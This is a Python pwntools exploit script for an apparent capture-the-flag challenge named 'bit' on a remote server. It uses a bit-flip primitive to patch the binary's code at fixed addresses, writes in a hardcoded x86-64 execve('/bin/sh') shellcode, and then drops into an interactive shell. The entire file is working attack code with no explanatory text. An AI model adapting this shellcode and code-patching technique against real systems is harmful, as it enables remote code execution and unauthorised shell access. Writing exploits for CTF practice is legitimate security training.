from pwn import *
import sys

def leak(addr, size, title=""):
	print "*** {} : {} ***".format(hex(addr), title)
	print hexdump(p.leak(addr, size), begin=addr, skip=False)

p = None
server = "flatearth.fluxfingers.net"
port = 1744
DEBUG = 0

if len(sys.argv) >= 2:
	DEBUG = 1
	p = process("./bit")
else:
	DEBUG = 0
	p = remote(server, port)
	

main = 0x400636
fix  = 0x40071d
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
code = "488b75f86448333425280000007405e8bffdffffc9c3662e0f1f84".decode("hex")

print "shellcode : ", shellcode.encode("hex")

p.sendline("400714:5")

if DEBUG != 0: leak(fix, 0x100, "fix")

# 40071d = 0x48
# 48  0 1 0 0 1 0 0 0
# 31  0 0 1 1 0 0 0 1
#p.sendline("40071d:0")

if DEBUG == 0:
	fix_data = code
else:
	fix_data = p.leak(fix, len(shellcode))

print fix_data.encode("hex")

for i in range(0, len(shellcode)):
	a = bin(ord(shellcode[i]))[2:]
	a = "0" * (8-(len(a)%8)) + a
	a = a[::-1]
	b = bin(ord(fix_data[i]))[2:]
	b = "0" * (8-(len(b)%8)) + b
	b = b[::-1]

	# 76543210
	# 00110001
	# 01001000

	for j in range(0, 8):
		if a[j] != b[j]:
			print "{}:{}".format(hex(fix+i), j)
			p.sendline("{}:{}".format(hex(fix+i), j))

p.sendline("{}:{}".format(hex(0x400714), 5))

#leak(fix, 0x100, "fix")

p.interactive()



